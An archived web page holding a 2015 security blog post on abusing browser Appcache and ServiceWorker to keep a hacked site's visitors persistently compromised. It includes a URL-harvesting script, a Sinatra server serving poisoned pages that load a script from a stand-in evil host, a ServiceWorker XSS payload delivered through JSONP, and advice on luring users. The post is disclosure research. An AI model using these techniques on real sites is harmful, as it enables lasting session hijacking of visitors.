@@ -1,0 +1,302 @@
+
+<!doctype html>
+<html class="no-js" xmlns="https://www.w3.org/1999/xhtml"
+      xmlns:fb="https://ogp.me/ns/fb#">
+<head>
+<base href="https://sakurity.com" />
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Using Appcache and ServiceWorker for Evil</title>
+
+    <meta name="description" content="We do penetration testing, source code auditing and vulnerability assessments">
+    <meta name="keywords"
+          content="Billing Security, Ruby on Rails Security, OAuth Security, Bitcoin Security, Framework Vulnerabilities">
+
+
+    <link rel="icon" type="image/x-icon" href="/images/favicon.ico"/>
+    <link rel="stylesheet" href="/styles/vendor.css"/>
+    <link rel="stylesheet" href="/styles/main.css"/>
+<meta property="og:image" content="https://www.sakurity.com/images/sakurity-logo@2x.png" />
+
+
+  <link rel="canonical" href="https://sakurity.com/blog/2015/08/13/middlekit.html">
+  <link rel="alternate" type="application/rss+xml" title="The Sakurity Blog" href="https://sakurity.com/blog/feed.xml" />
+
+
+
+
+
+
+</head>
+
+<body>
+
+
+<!--[if lt IE 10]>
+<p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade
+    your browser</a> to improve your experience.</p>
+<![endif]-->
+
+<nav class="top-bar row" data-topbar>
+    <section class="top-bar-section">
+
+        <ul class="left">
+            <li><a href="/">Home</a></li>
+            <li><a href="/blog">Blog</a></li>
+            <li><a href="/research">Research</a></li>
+            <li><a href="/contact">Contact Us</a></li>
+            <li><a href="https://twitter.com/SakurityNetwork">@SakurityNetwork</a></li>
+        </ul>
+
+    </section>
+</nav>
+    <div class="page-content">
+      <div class="wrapper">
+
+<div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">Using Appcache and ServiceWorker for Evil</h1>
+  </header>
+
+  <article class="post-content">
+<p>You’re a bad guy and you just hacked a website. Normally you leak the database and leave. The owner fixes everything next day and removes your backdoor. With Middlekit techniques you can poison browser cache of every visitor and get more money and intelligence in a long run.</p>
+
+<p>They call it “Advanced Persistent Threat” in the cyber snake oil industry. It silently sits in the victim’s user agent and waits for your commands. It can alter responses, proxy requests through your server etc - it is permanent session hijacking and XSS.</p>
+
+<p><img src="/img/mk.png" /></p>
+
+<p>I am not going to give you specific software, but will explain two approaches: appcache and serviceworker.</p>
+
+<h2 id="appcache"><a href="https://www.html5rocks.com/en/tutorials/appcache/beginner/">Appcache</a></h2>
+
+<p>It works <a href="https://caniuse.com/#search=appcache">in all browsers</a>. You just need to add manifest itself in the CACHE MANIFEST section and <strong>the browser will always return poisoned documents from the cache</strong>.</p>
+
+<ul>
+  <li>You need to collect as many URLs as possible - you need to list them explicitly to make the user agent cache it. site:victim.com in google is a good start</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">'open-uri'</span>
+<span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">'https://www.google.ru/search?q=site%3Asakurity.com&amp;oq=site%3Asakurity.com&amp;aqs=chrome..69i57j69i58.2444j0j9&amp;sourceid=chrome&amp;es_sm=91&amp;ie=UTF-8'</span><span class="p">).</span><span class="nf">read</span>
+
+<span class="k">def</span> <span class="nf">get_pages</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>
+  <span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">'https://www.google.ru/search?q=site%3A'</span><span class="o">+</span><span class="n">domain</span><span class="o">+</span><span class="s1">'&amp;oq=site%3Asakurity.com&amp;aqs=chrome..69i57j69i58.2444j0j9&amp;sourceid=chrome&amp;es_sm=91&amp;ie=UTF-8&amp;start=10&amp;num=100&amp;'</span><span class="p">).</span><span class="nf">read</span>
+  <span class="n">r</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">scan</span> <span class="sr">/http:\/\/</span><span class="si">#{</span><span class="n">domain</span><span class="si">}</span><span class="sr">(.*?)[&amp;%]/im</span>
+  <span class="nb">puts</span> <span class="n">r</span><span class="p">.</span><span class="nf">flatten</span><span class="p">.</span><span class="nf">uniq</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="s1">' '</span><span class="p">)</span>
+<span class="k">end</span>
+<span class="n">get_pages</span> <span class="s1">'sakurity.com'</span></code></pre></figure>
+
+<ul>
+  <li>
+    <p>Don’t forget user specific URLs such as “/settings” or “/homakov/direct_messages”. You can generate the manifest on the fly.</p>
+  </li>
+  <li>
+    <p>Insert your middlekit in front of the hacked production server. For demonstration you can run following script locally and add <code class="highlighter-rouge">127.0.0.1 sakurity.com</code> to your <code class="highlighter-rouge">/etc/hosts</code>. <strong>It also works in MitM attacks over wifi against https:// websites.</strong></p>
+  </li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">'sinatra'</span>
+
+<span class="n">wire</span> <span class="o">=</span> <span class="nb">lambda</span> <span class="k">do</span>
+  <span class="k">if</span> <span class="n">params</span><span class="p">[</span><span class="ss">:utm_medium</span><span class="p">]</span>
+    <span class="n">r</span><span class="o">=</span>  <span class="s2">"real content"</span>
+  <span class="k">else</span>
+    <span class="n">r</span><span class="o">=&lt;&lt;</span><span class="no">HTML</span><span class="sh">
+&lt;html manifest='/a.appcache'&gt;
+&lt;script src="https://evil.com.site/middlekit.js"&gt;&lt;/script&gt;
+&lt;script&gt;
+function load(url){
+x=new XMLHttpRequest;
+x.open('get',url);
+
+x.setRequestHeader('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
+x.setRequestHeader('Cache-Control','max-age=0');
+x.setRequestHeader('Upgrade-Insecure-Requests','1');
+x.send();
+
+x.onreadystatechange=function(){
+  if(x.readyState==4){
+    document.write(x.responseText);
+    //document.body.parentElement.innerHTML = x.responseText;
+  }
+}
+}
+if(location.href.indexOf("?") != -1){
+
+  var u = location.href + "&amp;utm_medium=1";
+}else{
+  var u = location.href + "?utm_medium=1";
+}
+//history.pushState("","",url);
+console.log("Infected")
+load(u);
+&lt;/script&gt;
+&lt;/html&gt;
+</span><span class="no">HTML</span>
+  <span class="k">end</span>
+  <span class="n">r</span>
+<span class="k">end</span>
+
+<span class="n">pages</span> <span class="o">=</span> <span class="sx">%w{/ /reconnect /lengthextension /logindemo /peatio.pdf /stealtitle /blog/2015/03/15/authy_bypass.html /blog/2015/03/03/duo_format_injection.html /blog/2015/07/28/appcache.html /blog/2015/03/10/Profilejacking.html /blog/2015/06/04/mongo_ruby_regexp.html /blog/2015/05/08/pusher.html /blog/2015/03/04/hybrid_api_auth.html /blog/2015/03/27/slack_or_reset_token_hashing.html /blog/2015/07/18/2fa.html /blog/2015/05/21/starbucks.html /blog/2015/03/05/RECONNECT.html /blog/2014/01/01/puzzle1.html /blog/2015/04/10/email_password_manager.html /blog/2015/02/28/openuri.html /blog/2015/06/25/puzzle2.html /blog/2015/01/22/peatio-audit.html /blog/2015/01/10/hacking-bitcoin-exchanger.html /triple}</span>
+<span class="n">pages</span><span class="p">.</span><span class="nf">each</span><span class="p">{</span><span class="o">|</span><span class="n">page</span><span class="o">|</span>
+  <span class="n">get</span> <span class="n">page</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">wire</span>
+<span class="p">}</span>
+
+<span class="n">get</span> <span class="s1">'/a.appcache'</span> <span class="k">do</span>
+  <span class="n">response</span><span class="p">.</span><span class="nf">headers</span><span class="p">[</span><span class="s1">'cache-control'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'max-age=3155760000'</span>
+  <span class="n">response</span><span class="p">.</span><span class="nf">headers</span><span class="p">[</span><span class="s1">'content-type'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'text/cache-manifest; charset=UTF-8'</span>
+<span class="s2">"CACHE MANIFEST
+/a.appcache
+</span><span class="si">#{</span><span class="n">pages</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span><span class="si">}</span><span class="s2">
+"</span>
+<span class="k">end</span></code></pre></figure>
+
+<ul>
+  <li>
+    <p>Get as many users as possible to visit the hacked server right now - try a newsletter.</p>
+  </li>
+  <li>
+    <p>Now all of them load your middlekit.html first, and there is no way to destroy appcache with javascript. The admins have to ask every user to visit chrome://appcache-internals/ manually</p>
+  </li>
+</ul>
+
+<h2 id="serviceworker"><a href="https://www.html5rocks.com/en/tutorials/service-worker/introduction/">ServiceWorker</a></h2>
+
+<p>This one works only in Chrome on desktop and only over https: websites, but is actually much more dangerous. It creates a worker which alters responses for all requests and there’s no need to explicitly cache every page - you can cover entire domain with one worker.</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">onfetch</span><span class="o">=</span><span class="n">function</span><span class="p">(</span><span class="n">e</span><span class="p">){</span>
+  <span class="n">e</span><span class="p">.</span><span class="nf">respondWith</span><span class="p">(</span><span class="kp">new</span> <span class="no">Response</span><span class="p">(</span><span class="s1">'&lt;script&gt;alert(document.domain)&lt;/script&gt;'</span><span class="p">,{</span><span class="ss">headers: </span><span class="p">{</span><span class="s1">'Content-Type'</span><span class="ss">:'text/html'</span><span class="p">}}))</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>To install a ServiceWorker the browser wants to see it as a response with <code class="highlighter-rouge">content-type:text/javascript</code>. Pinky, are you pondering what I’m pondering?</p>
+
+<p>Lots of JSONP endpoints respond with arbitrary JS. For instance <a href="https://gist.github.com/homakov/0ff5711729a14fb50b3f">look at my challenge</a>, this is <a href="https://clientsit.herokuapp.com/xss?user=%3Cscript%3E%0Anavigator.serviceWorker.register(%22%2Fjsonp%3Fcallback%3Donfetch%253Dfunction(e)%257B%250Ae.respondWith(new%2520Response(%27%253Cscript%253Ealert(document.domain)%253C%252Fscript%253E%27%252C%257Bheaders%253A%2520%257B%27Content-Type%27%253A%27text%252Fhtml%27%257D%257D))%250A%257D%252F%252F%22).then(function(registration)%20%7B%0A%20%20console.log(%27ServiceWorker%20registration%20successful%20with%20scope%3A%20%27%2C%20%20%20%20registration.scope)%3B%0A%7D).catch(function(err)%20%7B%0A%20%20console.log(%27ServiceWorker%20registration%20failed%3A%20%27%2C%20err)%3B%0A%7D)%3B%0A%3C%2Fscript%3E">the answer</a>.</p>
+
+<p>In other words <strong>XSS + JSONP + ServiceWorker = Permanent XSS on every page</strong></p>
+
+<h2 id="recap">Recap</h2>
+
+<p>Appcache is too late to fix, and it’s going to be perfect cache poisoning tool for a long while for both hacked websites and insecure connections (yet another reason to avoid https:// when you’re on someone’s wifi).</p>
+
+<p>ServiceWorker is very young and powerful technology, and should be implemented more carefully, taking into account how common JSONP endpoints are. I believe it was a bad idea to allow any text/javascript responses to become a ServiceWorker. At least it should be an extra header <code class="highlighter-rouge">Service-Worker:true</code> or explicit <code class="highlighter-rouge">Content-Type:text/javascript-serviceworker</code>.</p>
+
+
+
+<p><a href="https://twitter.com/share" class="twitter-share-button" data-url="https://sakurity.com/blog/2015/08/13/middlekit.html" data-text="Using Appcache and ServiceWorker for Evil" data-via="sakuritynetwork" data-related="sakuritynetwork">Share on Twitter</a>
+<script>
+!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');
+</script></p>
+
+<h3>Aug 13, 2015 • Egor Homakov (<a href='https://twitter.com/homakov'>@homakov</a>)</h3>
+
+
+<h3 class="rss-subscribe">Subscribe to our blog via <a href="https://twitter.com/SakurityNetwork">Twitter @SakurityNetwork</a>, <a href="/blog/feed.xml">RSS</a> or <a href="https://feedrabbit.com/subscriptions/new?url=https://sakurity.com/blog/feed.xml">Email</a></h3>
+  </article>
+
+
+
+
+
+
+<div id="spot-im-frame-inpage" data-post-id=""></div>
+
+
+</div></div>
+
+
+
+<div class="content">
+
+<!--<section class="inverse contact-us">
+
+    <div class="row">
+        <div class="small-12 small-text-center columns">
+            <h2>Trusted by</h2>
+        </div>
+    </div>
+
+    <div class="row">
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://www.coinbase.com/">
+            <div class="client client-coinbase"></div>
+          </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://www.airbnb.com/">
+            <div class="client client-airbnb"></div>
+          </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://stripe.com/">
+                <div class="client client-stripe"></div>
+            </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://www.uber.com/">
+            <div class="client client-uber"></div>
+          </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://mixpanel.com/">
+            <div class="client client-mixpanel"></div>
+          </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://wordpress.com/">
+            <div class="client client-wordpress"></div>
+          </a>
+        </div>
+    </div>
+
+
+    <div class="section-pattern">    
+        <div class="row">
+            <div class="small-10 small-centered small-text-center columns">
+
+                <p>Reach out to us if you want to see how our security audits can
+                    help your business,<br> or if you have any questions.</p>
+            </div>
+        </div>
+        <div class="row">
+            <div class="small-12 small-centered columns small-text-center">
+                <a href="/contact" class="button large pull success">Contact</a>
+            </div>
+        </div>
+    </div>
+</section>-->
+
+</div>
+
+
+
+<footer>
+    <div class="row">
+        <div class="small-6 medium-3 large-2 columns">
+            <h4>Sakurity</h4>
+            <ul>
+            <li><a href="/">Home</a></li>
+            <li><a href="/blog">Blog</a></li>
+            <li><a href="/research">Research</a></li>
+            <li><a href="/contact">Contact Us</a></li>
+            <li><a href="https://twitter.com/SakurityNetwork">@SakurityNetwork</a></li>
+            </ul>
+        </div>
+
+
+
+        <div class="small-12 medium-6 large-8 small-text-center medium-text-right columns">
+            <div class="logo-monochrome"></div>
+            <p class="copyright">Sakurity Ltd, a Hong Kong company established in 2012.<br><a href="mailto:info@sakurity.com">info@sakurity.com</a></p>
+        </div>
+    </div>
+</footer>
+</body>
+</html>
